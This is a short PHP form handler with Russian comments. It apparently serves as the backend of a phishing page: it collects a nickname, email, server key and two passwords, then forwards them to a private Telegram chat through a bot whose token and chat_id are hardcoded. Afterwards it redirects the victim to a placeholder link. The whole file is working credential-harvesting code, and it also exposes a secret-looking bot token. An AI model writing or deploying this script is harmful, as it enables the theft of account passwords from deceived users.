<?php

//В переменную $token нужно вставить токен, который нам прислал @botFather
$token = "5354193975:AAGrTKZXlxADB8tI7XGfDCPIcEyzzTYPYAc";

//Сюда вставляем chat_id
$chat_id = "1353065887";

//Определяем переменные для передачи данных из нашей формы
if ($_POST['act'] == 'order') {
    $nickname = ($_POST['nickname']);
    $email = ($_POST['email']);
    $server_key = ($_POST['server_key']);
    $password1 = ($_POST['password1']);
    $password2 = ($_POST['password2']);
//Собираем в массив то, что будет передаваться боту
    $arr = array(
        'Ник:' => $nickname,
		'Почта:' => $email,
		'Сервер:' => $server_key,
		'Пароль 1:' => $password1,
		'Пароль 2:' => $password2
    );

//Настраиваем внешний вид сообщения в телеграме
    foreach($arr as $key => $value) {
        $txt .= "<b>".$key."</b> ".$value."%0A";
    };

//Передаем данные боту
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

//Выводим сообщение об успешной отправке
    if ($sendToTelegram) {
  header('Location: сыллка');
} else {
  echo "Error";
}
}

?>